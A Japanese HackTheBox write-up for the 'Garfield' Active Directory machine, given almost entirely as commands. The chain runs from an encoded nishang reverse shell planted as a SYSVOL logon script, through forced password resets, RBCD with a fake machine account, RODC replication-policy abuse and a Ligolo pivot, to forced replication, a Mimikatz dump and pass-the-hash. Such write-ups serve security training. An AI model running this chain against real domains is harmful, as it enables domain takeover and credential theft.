🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Garfield — HackTheBox ライトアップ

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a7ee5b5ec5cb4c2bf96545fda71ea8e6.png" width="120"/>
<div>

**難易度**: Hard  
**OS**: Windows  
**タイプ**: Active Directory  

</div>
</div>

---

## 攻撃チェーンの概要

```
j.arbuckle → ログオンスクリプト (SYSVOL) → l.wilson → ForceChangePassword → l.wilson_adm
→ RODC01 への RBCD → wmiexec Administrator@RODC01 → repadmin rodcpwdrepl
→ Mimikatz ダンプ → Administrator NT ハッシュ → ROOT
```

---

## 列挙

### Nmap スキャン

```bash
nmap -sV -sC 10.129.x.x -oN scan.txt
```

開放ポート: DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985), RDP (3389).  
ターゲット: `DC01.garfield.htb` — Windows Server 2019.

### 初期認証情報

```
j.arbuckle / Th1sD4mnC4t!@1978
```

### LDAP 列挙と AD 権限

```bash
ldapdomaindump -u 'garfield.htb\j.arbuckle' -p 'Th1sD4mnC4t!@1978' 10.129.x.x

bloodyAD -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.x.x get writable
```

`j.arbuckle` は `CN=Liz Wilson` (`l.wilson`) と `CN=Liz Wilson ADM` (`l.wilson_adm`) に対して WRITE 権限を持っている。

### SMB 列挙

```bash
nxc smb 10.129.x.x -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
```

NETLOGON 共有の中に `printerDetect.bat` が見つかる — `l.wilson` のログオン時に実行されるスクリプト。

---

## 初期侵入 — ログオンスクリプト経由のシェル

### リバースシェルの生成

```bash
grep -v '^#' /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0 > /tmp/b64.txt
B64=$(cat /tmp/b64.txt)
echo "powershell -e $B64" > /tmp/printerDetect.bat
```

### SYSVOL へのアップロード

```bash
smbclient //10.129.x.x/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c 'cd garfield.htb\scripts; put /tmp/printerDetect.bat printerDetect.bat'
```

### l.wilson の scriptPath を変更

```bash
bloodyAD -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.x.x \
  set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v 'printerDetect.bat'
```

### リスナー

```bash
nc -lvnp 9001
```

`l.wilson` としてシェルを取得。

---

## ユーザーフラグ

### l.wilson_adm のパスワード変更

`l.wilson` のシェルから:

```powershell
$newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

### WinRM 接続

```bash
evil-winrm -i 10.129.x.x -u 'l.wilson_adm' -p 'WhoKnows123!'
```

```powershell
type C:\Users\l.wilson_adm\Desktop\user.txt
```

---

## 権限昇格 — RODC 攻撃

### l.wilson_adm の権限列挙

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x get writable
```

`CN=RODC01` に対して WRITE 権限あり。

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x \
  get object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' \
  --attr msDS-KrbTgtLink,msDS-RevealOnDemandGroup,msDS-NeverRevealGroup,msDS-RevealedList
```

重要な発見:
- RODC は `krbtgt_8245` を使用 (rodcNumber: **8245**)
- krbtgt_8245 の AES256 キー: `d6c93cbe006372ad....`
- RODC01 は `192.168.100.2` (内部ネットワーク) に存在

### RODC Administrators グループへの追加

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x \
  add groupMember 'RODC Administrators' 'l.wilson_adm'
```

### RBCD (リソースベースの制約付き委任) の設定

**偽のマシンアカウントを作成:**

```bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' \
  -dc-ip 10.129.x.x 'garfield.htb/l.wilson_adm:WhoKnows123!'
```

**evil-winrm から RBCD を設定:**

```powershell
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
```

### RODC レプリケーションポリシーの変更

PowerView をインポートし、Administrator のパスワードをレプリケートできるよう RODC の属性を変更:

```powershell
Import-Module .\PowerView.ps1

Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```

または Kali から ldapmodify を使用:

```bash
ldapmodify -x -H ldap://10.129.x.x -D 'l.wilson_adm@garfield.htb' -w 'WhoKnows123!' << 'EOF'
dn: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
changetype: modify
add: msDS-RevealOnDemandGroup
msDS-RevealOnDemandGroup: CN=Administrator,CN=Users,DC=garfield,DC=htb
EOF
```

### 内部ネットワークへの Ligolo トンネル

RODC01 (`192.168.100.2`) には直接アクセスできないため、DC01 を経由して Ligolo でピボット。

**Kali:**
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

**DC01 (evil-winrm):**
```powershell
upload agent.exe
.\agent.exe -connect 10.10.x.x:11601 -ignore-cert
```

**Ligolo CLI:**
```
session
start
```

**ルートを追加:**
```bash
sudo ip route add 192.168.100.0/24 dev ligolo
```

### RBCD を利用して RODC01 に Administrator シェルを取得

```bash
sudo ntpdate 10.129.x.x
unset KRB5CCNAME
getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip 10.129.x.x 'garfield.htb/FAKE$:FakePass123!'
export KRB5CCNAME='Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache'
wmiexec.py -k -no-pass -target-ip 192.168.100.2 garfield.htb/Administrator@RODC01.garfield.htb
```

### Administrator のパスワードを強制レプリケート

RODC01 のシェルから:

```
repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

期待される出力: `Successfully replicated secrets for user CN=Administrator...`

### Mimikatz で Administrator ハッシュをダンプ

(前のステップで既に `C:\Windows\Temp\` に配置済みの) mimikatz を実行:

```
C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:Administrator" exit
```

Administrator のハッシュを取得。

---

## ルートフラグ

```bash
evil-winrm -i 10.129.x.x -u Administrator -H <NTLMHASH>
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 使用ツール

- `nmap` — ポートスキャン
- `ldapdomaindump` — LDAP 列挙
- `bloodyAD` — AD オブジェクト操作
- `nxc` (NetExec) — SMB 列挙
- `smbclient` — SYSVOL へのファイルアップロード
- `nishang` — PowerShell リバースシェル
- `evil-winrm` — WinRM シェル
- `PowerView` — AD オブジェクト操作
- `impacket` (addcomputer, getST, wmiexec) — Kerberos / RBCD 攻撃
- `ligolo-ng` — 内部ネットワークへのトンネル
- `mimikatz` — クレデンシャルダンプ
- `repadmin` — RODC パスワードレプリケーション

---

## 注意事項

- `krbtgt_8245` の AES256 キー (`d6c93cbe...`) はこの Box の固定値
- クレデンシャルをレプリケートする前に、RODC01 の `msDS-NeverRevealGroup` をクリアし、`msDS-RevealOnDemandGroup` に Administrator を追加する必要がある